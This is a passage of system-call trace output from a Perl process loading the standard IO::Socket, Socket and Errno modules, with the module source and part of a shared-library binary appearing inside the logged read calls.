$protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
5839  07:10:58.163570 stat64("/etc/perl/Socket.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163587 stat64("/etc/perl/Socket.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163600 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163626 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163640 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163653 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163666 stat64("/usr/lib/perl5/Socket.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163678 stat64("/usr/lib/perl5/Socket.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163691 stat64("/usr/share/perl5/Socket.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163703 stat64("/usr/share/perl5/Socket.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163716 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.163732 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
5839  07:10:58.163753 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.163767 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.163778 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.163795 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
5839  07:10:58.164226 brk(0x8239000)    = 0x8239000
5839  07:10:58.164426 read(8, "", 4096) = 0
5839  07:10:58.164441 close(8)          = 0
5839  07:10:58.164605 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5839  07:10:58.164631 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5839  07:10:58.164657 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
5839  07:10:58.164671 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
5839  07:10:58.164760 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5839  07:10:58.164778 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7dba000
5839  07:10:58.164791 mmap2(0xb7dbf000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7dbf000
5839  07:10:58.164807 close(8)          = 0
5839  07:10:58.165435 brk(0x825a000)    = 0x825a000
5839  07:10:58.165643 stat64("/etc/perl/Errno.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165661 stat64("/etc/perl/Errno.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165675 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165687 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165701 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165714 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165728 stat64("/usr/lib/perl5/Errno.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165740 stat64("/usr/lib/perl5/Errno.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165752 stat64("/usr/share/perl5/Errno.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165764 stat64("/usr/share/perl5/Errno.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165777 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.165789 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
5839  07:10:58.165810 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.165824 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.165835 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.165855 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
5839  07:10:58.166673 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
5839  07:10:58.167147 _llseek(8, 5966, [5966], SEEK_SET) = 0
5839  07:10:58.167165 _llseek(8, 0, [5966], SEEK_CUR) = 0
5839  07:10:58.167175 close(8)          = 0
5839  07:10:58.168303 brk(0x827b000)    = 0x827b000
5839  07:10:58.168430 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
5839  07:10:58.168946 _llseek(6, 6698, [6698], SEEK_SET) = 0
5839  07:10:58.168963 _llseek(6, 0, [6698], SEEK_CUR) = 0
5839  07:10:58.168973 close(6)          = 0
5839  07:10:58.168992 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169006 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169020 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169033 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169047 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169060 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169074 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169086 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169099 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169111 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
